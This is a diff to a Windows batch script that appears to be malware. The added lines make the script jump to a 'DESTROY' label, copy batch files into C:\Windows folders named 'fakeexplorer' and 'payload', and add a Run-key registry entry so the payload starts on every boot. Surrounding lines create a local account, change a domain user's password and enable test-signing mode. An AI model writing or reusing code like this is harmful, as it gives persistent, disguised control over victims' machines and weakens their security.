@@ -190,10 +190,15 @@ IF %M%==1 GOTO MAININSTALLBB
 net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
-goto eeee
+goto DESTROY
 :eeee
+mkdir c:\windows\fakeexplorer
+mkdir c:\windows\payload
+copy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer
+copy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
 :AAAAJJ
